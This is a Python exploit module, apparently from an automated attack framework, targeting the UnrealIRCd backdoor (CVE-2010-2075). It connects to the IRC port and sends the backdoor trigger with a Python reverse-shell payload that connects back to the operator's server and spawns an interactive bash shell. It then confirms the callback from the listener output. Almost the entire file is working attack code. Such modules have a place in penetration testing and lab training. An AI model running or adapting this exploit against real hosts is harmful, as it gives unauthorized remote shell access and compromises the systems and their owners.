#######################################################
# UnrealIRCd Backdoor/RCE
# CVE-2010-2075
# Metasploit: exploit/unix/irc/unreal_ircd_3281_backdoor
#
# This exploit utilizes a backdoor that was placed in
# UnrealIRCd to obtain RCE.
#######################################################

from utils import Exploit
import socket
import re
from shells.reverse_shell import ReverseShell
import time

class IRCSocket:
    '''Class for interacting with Unreal IRCd service'''

    PORT = 6697

    def __init__(self, ip: str):
        self.ip = ip
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        '''Connect to IRC server'''
        self.s.settimeout(15)
        try:
            self.s.connect((self.ip, self.PORT))
            return True
        except socket.timeout:
            # Connection to IRC timed out
            return False
        except Exception as e:
            # Could not connect to IRC for unknown reason
            return False
    
    def close(self):
        '''Close connection to IRC server'''
        self.s.close()

    def send(self, msg: str):
        '''Send a message to IRC server'''
        self.s.send(msg.encode())

class IRCdBackdoor(Exploit):
    '''Class for performing the Unreal IRCd backdoor exploit.'''
    payload = """AB; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{server_ip}",{server_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &"""

    def __init__(self, server_ip: str):
        super().__init__(
            os='linux',
            name='Unreal IRCd backdoor',
            description='',
            requirements=['irc'],
            webserver=False,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target and return a reverse shell'''
        # Connect to IRC
        self.message(target, 'Connecting to IRC...')
        irc = IRCSocket(target)
        if not irc.connect():
            self.error(target, 'Could not connect; skipping this target')
            return
        
        # Create reverse shell listener
        self.message(target, 'Creating reverse shell...')
        revshell = ReverseShell(target, self.os)

        # Send payload to connect to reverse shell
        self.message(target, 'Sending payload...')
        payload = self.payload.format(server_ip=self.server_ip, server_port=revshell.get_port())
        irc.send(payload)

        # Get netcat output
        time.sleep(5)
        output = revshell.get_all_output()
        # Check if a connection was received
        if re.search(r'connect to \[' + self.server_ip + r'] from .* \[' + target + r']', output):
            self.message(target, 'Received reverse shell connection')
            # Return reverse shell
            self.success(target)
            return revshell
        else:
            self.error(target, 'Did not receive reverse shell connection')
